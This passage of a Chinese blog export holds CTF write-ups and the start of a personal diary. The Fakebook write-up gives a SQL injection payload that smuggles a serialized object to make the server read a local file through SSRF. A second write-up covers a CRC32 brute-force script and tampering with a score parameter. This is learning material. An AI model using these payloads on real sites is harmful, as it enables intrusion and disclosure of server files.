class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"ko\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>User<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/bootstrap.min.css\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/jquery-3.3.1.slim.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/popper.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/bootstrap.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">\"table\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                username</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                age</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                blog</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                2            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                12            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                file:///var/www/html/flag.php            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>the contents of his/her blog<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">width</span>=<span class=\"string\">'100%'</span> <span class=\"attr\">height</span>=<span class=\"string\">'10em'</span> <span class=\"attr\">src</span>=<span class=\"string\">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点击即可看见flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$flag = <span class=\"string\">\"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure>\n\n<p>拿到<code>user.php</code>的源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class UserInfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $name &#x3D; &quot;&quot;;</span><br><span class=\"line\">    public $age &#x3D; 0;</span><br><span class=\"line\">    public $blog &#x3D; &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($name, $age, $blog)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;name &#x3D; $name;</span><br><span class=\"line\">        $this-&gt;age &#x3D; (int)$age;</span><br><span class=\"line\">        $this-&gt;blog &#x3D; $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get($url)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch &#x3D; curl_init();   &#x2F;&#x2F;初始化链接</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);     &#x2F;&#x2F;设置CURLOPT_URL</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   &#x2F;&#x2F;将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span><br><span class=\"line\">        $output &#x3D; curl_exec($ch);      &#x2F;执行CURL会话;此处存在ssrf</span><br><span class=\"line\">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class=\"line\">            return 404;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        return $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getBlogContents ()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return $this-&gt;get($this-&gt;blog);  &#x2F;&#x2F;获取博客地址</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isValidBlog ()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $blog &#x3D; $this-&gt;blog;</span><br><span class=\"line\">        return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog);  &#x2F;&#x2F;博客地址有过滤</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>\n<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>\n<p><img src=\"/pic/4.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>\n\n<p>执行结果</p>\n<p><img src=\"/pic/5.png\" alt=\"\"></p>\n<p>查看源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"ko\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>User<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/bootstrap.min.css\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/jquery-3.3.1.slim.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/popper.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/bootstrap.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">\"table\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                username</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                age</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                blog</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                2            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                12            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                file:///var/www/html/flag.php            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>the contents of his/her blog<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">width</span>=<span class=\"string\">'100%'</span> <span class=\"attr\">height</span>=<span class=\"string\">'10em'</span> <span class=\"attr\">src</span>=<span class=\"string\">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点击即可看见flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$flag = <span class=\"string\">\"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>"},{"title":"元旦安恒月赛","date":"2020-01-02T06:29:54.000Z","_content":"\n## 安恒元旦月赛\n\n自己就看了这两个题目，其他都是队友解的。\n\n### MISC\n\n#### 爆破鬼才\n\n首先爆破第一个密码（队友已经爆破出来了）abc123\n\n解压后还是一个压缩包\n\n![](/pic/6.png)\n\n发现`1.txt、2.txt、3.txt`长度不长，应该是要进行CRC32碰撞，附上渣渣脚本\n\n```python\n#coding:utf-8\nimport zipfile\nimport string\nimport binascii\n\ndic=string.printable\ncrc = 0x7d90ee19   \nfor i in dic :\n    for j in dic:\n        for p in dic:\n            for q in dic:\n                s=str(i)+str(j)+str(p)+str(q)\n                if crc == (binascii.crc32(s) & 0xffffffff):\n                    print  s\n```\n\n这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好\n\n最后得到的结果是`Blowitup`，打开压缩包，hint.txt中的内容是`guess out my birthday! `，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是[`outguess`](https://github.com/crorvick/outguess)加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用`os.system`跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。\n\n最后跑出来的密码是20140224。拿着key解密\n\n得到`flag:flag{8322e7eed667c69f27ecbea5f96d86ca}`\n\n### web\n\n#### web1\n\n是一个小游戏，话不多说开始玩一把。\n\n![](/pic/7.png)\n\n玩了一把后查看源码，发现有一个js。\n\n```html\n<!DOCTYPE html>\n<html >\n<head>\n<meta charset=\"UTF-8\">\n<title>JS Planet defense game</title>\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\">\n<link rel=\"stylesheet\" href=\"css/style.css\">\n</head>\n\n<body>\n<body>\n<canvas id=\"canvas\"></canvas>\n\n</body>\n<script src=\"js/index.js\"></script>\n\n</body>\n</html>\n\n```\n\n点进去拉到最后有几条提示\n\n![](/pic/8.png)\n\n生成一个http请求，将分数发到服务器，将结果显示。\n\n既然要生成请求，直接上`burp suite`，会发送一个record\n\n```\nPOST /f1ag.php HTTP/1.1\nHost: 183.129.189.60:10001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 9\nOrigin: http://183.129.189.60:10001\nConnection: close\nReferer: http://183.129.189.60:10001/\n\nrecord=23\n```\n\n将`record`改成`99999999999999999999999999999999999999999999999999`，即可拿到flag","source":"_posts/元旦安恒月赛.md","raw":"---\ntitle: 元旦安恒月赛\ndate: 2020-01-02 14:29:54\ntags:\n - 安恒月赛2020\n - ctf\n - wp\n---\n\n## 安恒元旦月赛\n\n自己就看了这两个题目，其他都是队友解的。\n\n### MISC\n\n#### 爆破鬼才\n\n首先爆破第一个密码（队友已经爆破出来了）abc123\n\n解压后还是一个压缩包\n\n![](/pic/6.png)\n\n发现`1.txt、2.txt、3.txt`长度不长，应该是要进行CRC32碰撞，附上渣渣脚本\n\n```python\n#coding:utf-8\nimport zipfile\nimport string\nimport binascii\n\ndic=string.printable\ncrc = 0x7d90ee19   \nfor i in dic :\n    for j in dic:\n        for p in dic:\n            for q in dic:\n                s=str(i)+str(j)+str(p)+str(q)\n                if crc == (binascii.crc32(s) & 0xffffffff):\n                    print  s\n```\n\n这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好\n\n最后得到的结果是`Blowitup`，打开压缩包，hint.txt中的内容是`guess out my birthday! `，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是[`outguess`](https://github.com/crorvick/outguess)加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用`os.system`跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。\n\n最后跑出来的密码是20140224。拿着key解密\n\n得到`flag:flag{8322e7eed667c69f27ecbea5f96d86ca}`\n\n### web\n\n#### web1\n\n是一个小游戏，话不多说开始玩一把。\n\n![](/pic/7.png)\n\n玩了一把后查看源码，发现有一个js。\n\n```html\n<!DOCTYPE html>\n<html >\n<head>\n<meta charset=\"UTF-8\">\n<title>JS Planet defense game</title>\n<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css\">\n<link rel=\"stylesheet\" href=\"css/style.css\">\n</head>\n\n<body>\n<body>\n<canvas id=\"canvas\"></canvas>\n\n</body>\n<script src=\"js/index.js\"></script>\n\n</body>\n</html>\n\n```\n\n点进去拉到最后有几条提示\n\n![](/pic/8.png)\n\n生成一个http请求，将分数发到服务器，将结果显示。\n\n既然要生成请求，直接上`burp suite`，会发送一个record\n\n```\nPOST /f1ag.php HTTP/1.1\nHost: 183.129.189.60:10001\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-type: application/x-www-form-urlencoded\nContent-Length: 9\nOrigin: http://183.129.189.60:10001\nConnection: close\nReferer: http://183.129.189.60:10001/\n\nrecord=23\n```\n\n将`record`改成`99999999999999999999999999999999999999999999999999`，即可拿到flag","slug":"元旦安恒月赛","published":1,"updated":"2020-02-06T08:17:02.161Z","_id":"ck4wg88at0000yk7eghziaddi","comments":1,"layout":"post","photos":[],"link":""},{"title":"年末总结","date":"2019-12-31T15:31:39.000Z","encrypt":"enable","enc_pwd":"7b7a53e239400a13bd6be6c91c4f6c4e","_content":"\n## 年末总结\n\n### 1月\n\n月初这个时候应该快要放假，但是自己已经在家，因为一些原因直接回去了，没有参加学校的考试。在家里从头学了一遍汇编。虽然开了汇编课程，但是上了课与学没没有是两回事！！跟着视频一边看一边做。\n\n### 2月\n\n二月是颓废的一个月，什么都没有学。只是在家里睡觉，吃饭，走亲戚。自己觉得过年其实也就那样吧，越大就月不太想过年。比开学时间早了一周去学校。\n\n### 3月\n\n月初，开学了。也是准备考试（补考）的时候，开学第二周考试，两天之内考8门考试。但是自己一点也不慌，知道自己什么水平，每次都是及格边缘，不会挂科，也不会好到哪里去。考试过后就是每天的上课。\n\n### 4月\n\n4月也是比较闲的一个月。除了每天的上课，就是逛逛网页，有什么新东西，还有就是和别人聊聊天。这个月要举办ACM校赛，要负责准备工作（卑微的工作人员）。\n\n###  5月\n\n参加了一个老师推荐的比赛，初赛是答题，复赛交作品，决赛完善作品。初赛因为实验室所在大楼举办计算机登记考试，不让进去！！只好在网吧参加考试，只拿到了56分，本以为凉了，但是破天荒的进入了复赛！复赛名单出来还是挺开心的。\n\n### 6月\n\n参加了老师的一个智能家居的项目。前期是看论文，看看这个方向的进展。大部分都是英文的看得有一点点头痛。后面因为队友也不太给力，自己也。。。。。。就这样凉了。参加了四六级考试（裸考）。考前不复习，考试到达考场就不想去了。还是硬着头皮进去了，听力就和听天书似的。\n\n###  7月\n\n月初又是考试周， 